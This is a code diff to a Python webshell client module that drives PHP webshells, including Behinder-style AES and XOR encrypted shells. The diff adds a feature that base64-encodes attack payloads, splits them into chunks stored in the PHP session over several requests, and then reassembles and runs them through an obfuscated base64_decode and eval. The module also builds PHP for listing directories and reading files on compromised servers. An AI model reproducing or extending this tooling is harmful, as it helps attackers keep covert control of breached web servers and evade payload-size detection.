@@ -21,8 +21,12 @@ from .base import Session, DirectoryEntry
 logger = logging.getLogger("sessions.php")
 
 SUBMIT_WRAPPER_PHP = """\
-echo '{delimiter_start_1}'.'{delimiter_start_2}';\
-try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}\
+if (session_status() == PHP_SESSION_NONE) {{
+    session_id('{session_id}');
+    session_start();
+}}
+echo '{delimiter_start_1}'.'{delimiter_start_2}';
+try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
 echo '{delimiter_stop}';"""
 
 LIST_DIR_PHP = """
@@ -68,22 +72,62 @@ else if(filesize($filePath) > MAX_SIZE) {
 }
 """
 
-__all__ = ["PHPWebshell", "PHPWebshellOneliner", "PHPWebshellBehinderAES", "PHPWebshellBehinderXor"]
+PAYLOAD_SESSIONIZE = """
+$b64_part = 'B64_PART';
+if(!$_SESSION['PAYLOAD_STORE']) {
+    $_SESSION['PAYLOAD_STORE'] = array();
+}
+$_SESSION['PAYLOAD_STORE'][PAYLOAD_ORDER] = $b64_part;
+"""
+
+PAYLOAD_SESSIONIZE_TRIGGER = """
+if(!$_SESSION['PAYLOAD_STORE']) {
+    echo "PAYLOAD_SESSIONIZE_UNEXIST";
+}else{
+    $payload = "";
+    $parts = $_SESSION['PAYLOAD_STORE'];
+    for($i = 0; $i < count($parts); $i ++) {
+        if(!$parts[$i]) {
+            break;
+        }
+        $payload .= $parts[$i];
+    }
+    if($i != count($parts)) {
+        echo "PAYLOAD_SESSIONIZE_UNEXIST";
+    }else{
+        $payload = ("base"."64_decode")($payload);
+        eval($payload);
+    }
+}
+unset($_SESSION['PAYLOAD_STORE']);
+"""
+
+PAYLOAD_SESSIONIZE_CHUNK = 5000
+
+__all__ = [
+    "PHPWebshell",
+    "PHPWebshellOneliner",
+    "PHPWebshellBehinderAES",
+    "PHPWebshellBehinderXor",
+]
 
 
 def md5_encode(s):
+    """将给定的字符串或字节序列转换成MD5"""
     if isinstance(s, str):
         s = s.encode()
     return hashlib.md5(s).hexdigest()
 
 
 def base64_encode(s):
+    """将给定的字符串或字节序列编码成base64"""
     if isinstance(s, str):
         s = s.encode("utf-8")
     return base64.b64encode(s).decode()
 
 
 def behinder_aes(payload, key):
+    """将给定的payload按照冰蝎的格式进行AES加密"""
     iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     cipher = AES.new(key, AES.MODE_CBC, iv=iv)
     payload = "1|" + payload
@@ -92,16 +136,38 @@ def behinder_aes(payload, key):
 
 
 def behinder_xor(payload: str, key: bytes):
+    """将给定的payload按照冰蝎的格式进行Xor加密"""
     payload = ("1|" + payload).encode()
-    payload = bytes([c ^ key[i+1&15] for i, c in enumerate(payload)])
+    payload = bytes([c ^ key[i + 1 & 15] for i, c in enumerate(payload)])
     return base64_encode(payload)
 
+
+def to_sessionize_payload(payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK) -> str:
+    payload = base64_encode(payload)
+    payload_store_name = random_english_words()
+    payloads = []
+    for i in range(0, len(payload), chunk):
+        part = payload[i : i + chunk]
+        part = (
+            PAYLOAD_SESSIONIZE
+            .replace("PAYLOAD_ORDER", str(i))
+            .replace("B64_PART", part)
+            .replace("PAYLOAD_STORE", payload_store_name)
+        )
+        payloads.append(part)
+    final = (
+        PAYLOAD_SESSIONIZE_TRIGGER
+        .replace("PAYLOAD_STORE", payload_store_name)
+    )
+    payloads.append(final)
+    return payloads
 
 @dataclass
 class PHPWebshellOptions:
     """除了submit_raw之外的函数需要的各类选项"""
 
     encoder: t.Literal["raw", "base64"] = "raw"
+    sessionize_payload: bool = True
 
 
 def compress_php_code(source: str) -> str:
@@ -122,6 +188,7 @@ class PHPWebshell(Session):
 
     def __init__(self, options: t.Union[None, PHPWebshellOptions]):
         self.options = options if options else PHPWebshellOptions()
+        self.session_id = "".join(random.choices(string.hexdigits, k=16))  # TODO: change length
 
     def encode(self, payload: str) -> str:
         """应用编码器"""
@@ -194,7 +261,7 @@ class PHPWebshell(Session):
             return False
         return (first_string + second_string) in result
 
-    async def submit(self, payload: str) -> str:
+    async def _submit(self, payload: str) -> str:
         """将php payload通过encoder编码后提交"""
         start, stop = (
             "".join(random.choices(string.ascii_lowercase, k=6)),
@@ -205,8 +272,10 @@ class PHPWebshell(Session):
             delimiter_start_2=start[3:],
             delimiter_stop=stop,
             payload_raw=payload,
+            session_id=self.session_id
         )
         payload = compress_php_code(payload)
+        print(payload)
         payload = self.encode(payload)
         status_code, text = await self.submit_raw(payload)
         if status_code != 200:
@@ -227,6 +296,16 @@ class PHPWebshell(Session):
             )
         idx_stop = idx_stop_r + idx_start
         return text[idx_start + len(start) : idx_stop]
+
+    async def submit(self, payload: str):
+        # sessionize_payload
+        payloads = [payload]
+        if self.options.sessionize_payload:
+            payloads = to_sessionize_payload(payload)
+        result = None
+        for payload_part in payloads:
+            result = await self._submit(payload_part)
+        return result
 
     async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
         """提交原始php payload
@@ -306,6 +385,7 @@ class PHPWebshellBehinderAES(PHPWebshell):
         except httpx.HTTPError as exc:
             raise exceptions.NetworkError("发送HTTP请求失败") from exc
 
+
 class PHPWebshellBehinderXor(PHPWebshell):
     def __init__(
         self,
@@ -325,4 +405,3 @@ class PHPWebshellBehinderXor(PHPWebshell):
                 return response.status_code, response.text
         except httpx.HTTPError as exc:
             raise exceptions.NetworkError("发送HTTP请求失败") from exc
-
